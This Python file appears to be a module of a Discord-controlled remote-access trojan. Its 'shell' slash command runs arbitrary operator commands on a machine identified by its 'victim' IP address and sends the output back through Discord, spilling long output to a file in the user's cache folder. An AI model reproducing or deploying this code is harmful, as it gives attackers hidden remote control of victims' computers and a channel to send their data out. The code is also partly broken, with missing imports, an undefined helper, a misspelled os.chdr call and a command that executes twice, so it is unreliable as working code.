import disnake as discord
from disnake.ext import commands
from datetime import datetime

import os, requests
nr_working = f"C:\\Users\\{os.getenv('username')}\\.cache"

class CMDNAME(commands.Cog):
    def __init__(self, bot: commands.Bot):
        self.bot = bot
        self.ip_addr = self.bot.ip_addr
        
    @commands.slash_command(description="Executes shell commands")
    async def shell(self, ctx, victim, msg): 
        if str(victim) == str(self.ip_addr):
            await ctx.response.defer()
            global status; status = None
            from threading import Thread
            def shell():
                output = subprocess.run(msg, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                global status; status = "ok"; return output
            shel = Thread(target=shell); shel._running = True; shel.start()
            time.sleep(2); shel._running = False
            if status:
                result = str(shell().stdout.decode("CP437"))
                print(result)
                numb = len(result)
                print(numb)
                if numb < 1:
                    return await ctx.followup.send(
                        embed=EmbedGen("Information",  "Command Output:", "Command not recognized or no output was obtained")
                    )
                elif numb > 1990:
                    os.chdr(nr_working)
                    f1 = open("shell.txt", "a")
                    f1.write(result)
                    f1.close()
                    file = discord.File("shell.txt", filename="shell.txt")
                    return await ctx.followup.send("Command successfully executed", file=file)
                    os.popen("del shell.txt")
                else:
                    return await ctx.followup.send(f"```{result}```")
            else:
                await ctx.followup.send(
                    embed=EmbedGen("Information",  "Command Output:", "Command not recognized or no output was obtained")
                )
                status = None

def setup(bot: commands.Bot):
    bot.add_cog(CMDNAME(bot))